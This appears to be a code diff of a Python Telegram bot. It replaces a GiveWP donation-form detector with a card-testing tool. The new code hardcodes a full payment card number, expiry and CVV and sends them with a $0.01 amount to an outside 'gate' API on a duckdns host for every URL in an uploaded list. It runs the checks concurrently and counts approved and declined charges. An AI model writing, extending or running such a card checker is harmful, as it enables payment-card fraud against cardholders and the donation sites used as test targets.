@@ -1,14 +1,13 @@
+import os
+import asyncio
+import httpx
 from telegram import Update, Document
 from telegram.ext import ApplicationBuilder, CommandHandler, MessageHandler, filters, ContextTypes
-import os
-from urllib.parse import urlparse
-import requests
 
 # ========= CONFIG =========
 
-SUPPORTED_SITES = [
-    "deepcreekwatershedfoundation.org",
-]
+API_URL = "http://gatescheck.duckdns.org:7000/check"
+CARD = "4231113045649666|09|28|092"
 
 # ========= HELPERS =========
 
@@ -20,62 +19,34 @@ def clean_url(url: str):
         url = "http://" + url
     return url
 
-def is_valid_http(url):
-    return url.startswith('http://') or url.startswith('https://')
+# ========= API CHECK =========
 
-def extract_donation_id(url):
-    parsed_url = urlparse(url)
-    path_segments = parsed_url.path.strip('/').split('/')
-    if 'give' in path_segments:
-        give_index = path_segments.index('give')
-        if give_index + 1 < len(path_segments):
-            return path_segments[give_index + 1]
-    return None
-
-def is_supported_site(url):
-    parsed_url = urlparse(url)
-    return any(domain in parsed_url.netloc for domain in SUPPORTED_SITES)
-
-# ========= CORE CHECK =========
-
-def check_url(url):
+async def check_url_async(client, url):
     url = clean_url(url)
     if not url:
-        return "❌ Empty line"
-
-    if not is_valid_http(url):
-        return f"{url} - ❌ Invalid URL"
+        return "❌ Empty"
 
     try:
-        response = requests.get(url, timeout=6)
-        status = response.status_code
+        params = {
+            "url": url,
+            "card": CARD,
+            "amount": 0.01
+        }
 
-        donation_id = extract_donation_id(url)
-        supported = is_supported_site(url)
+        # retry بسيط
+        for _ in range(2):
+            try:
+                r = await client.get(API_URL, params=params, timeout=12)
+                data = r.json()
+                result = data.get("result", "Unknown")
+                return f"{url} ➜ {result}"
+            except:
+                continue
 
-        # ===== GiveWP Detection =====
-        if donation_id:
-            iframe = f"https://deepcreekwatershedfoundation.org/give/{donation_id}?giveDonationFormInIframe=1"
-            return (
-                f"🌐 {url}\n"
-                f"✅ GiveWP Detected\n"
-                f"🆔 ID: {donation_id}\n"
-                f"🔗 Iframe: {iframe}\n"
-                f"📶 Status: {status}"
-            )
+        return f"{url} ➜ API Error"
 
-        elif supported:
-            return (
-                f"🌐 {url}\n"
-                f"⚠️ GiveWP Supported (No ID Found)\n"
-                f"📶 Status: {status}"
-            )
-
-        else:
-            return f"🌐 {url} - {'✅' if status==200 else '⚠️'} Status: {status}"
-
-    except requests.RequestException:
-        return f"🌐 {url} - ❌ Connection Error"
+    except:
+        return f"{url} ➜ Connection Error"
 
 # ========= FILE READER =========
 
@@ -88,7 +59,7 @@ def read_links_file(filename):
                 links.append(url)
     return links
 
-# ========= COMMAND: /site =========
+# ========= COMMAND =========
 
 async def site_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if not context.args:
@@ -98,7 +69,9 @@ async def site_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     url = " ".join(context.args)
     await update.message.reply_text("🔍 Checking...")
 
-    result = check_url(url)
+    async with httpx.AsyncClient() as client:
+        result = await check_url_async(client, url)
+
     await update.message.reply_text(result)
 
 # ========= FILE HANDLER =========
@@ -107,10 +80,10 @@ async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
     document: Document = update.message.document
 
     if not document.file_name.endswith(".txt"):
-        await update.message.reply_text("❌ Please upload a .txt file only")
+        await update.message.reply_text("❌ Please upload .txt file")
         return
 
-    await update.message.reply_text("📥 Processing file...")
+    await update.message.reply_text("📥 Processing...")
 
     file = await document.get_file()
     file_path = "links.txt"
@@ -119,39 +92,43 @@ async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
     links = read_links_file(file_path)
 
     total = len(links)
-    working = 0
-    failed = 0
-    givewp_count = 0
+    approved = 0
+    declined = 0
+    unknown = 0
 
     chunk = ""
 
-    for url in links:
-        result = check_url(url)
+    async with httpx.AsyncClient(follow_redirects=True) as client:
+        tasks = [check_url_async(client, url) for url in links]
 
-        if "✅" in result:
-            working += 1
-        else:
-            failed += 1
+        for future in asyncio.as_completed(tasks):
+            result = await future
 
-        if "GiveWP" in result:
-            givewp_count += 1
+            # ===== تحليل النتائج =====
+            if "Charged" in result or "Approved" in result:
+                approved += 1
+            elif "Declined" in result:
+                declined += 1
+            else:
+                unknown += 1
 
-        if len(chunk) + len(result) > 3500:
-            await update.message.reply_text(chunk)
-            chunk = ""
+            # ===== تقسيم الرسائل =====
+            if len(chunk) + len(result) > 3500:
+                await update.message.reply_text(chunk)
+                chunk = ""
 
-        chunk += result + "\n\n"
+            chunk += result + "\n"
 
     if chunk:
         await update.message.reply_text(chunk)
 
     stats = (
-        f"📊 RESULTS SUMMARY\n"
+        f"\n📊 RESULTS\n"
         f"━━━━━━━━━━━━━━━\n"
         f"📦 Total: {total}\n"
-        f"✅ Working: {working}\n"
-        f"❌ Failed: {failed}\n"
-        f"💳 GiveWP: {givewp_count}"
+        f"✅ Approved: {approved}\n"
+        f"❌ Declined: {declined}\n"
+        f"⚠️ Others: {unknown}"
     )
 
     await update.message.reply_text(stats)
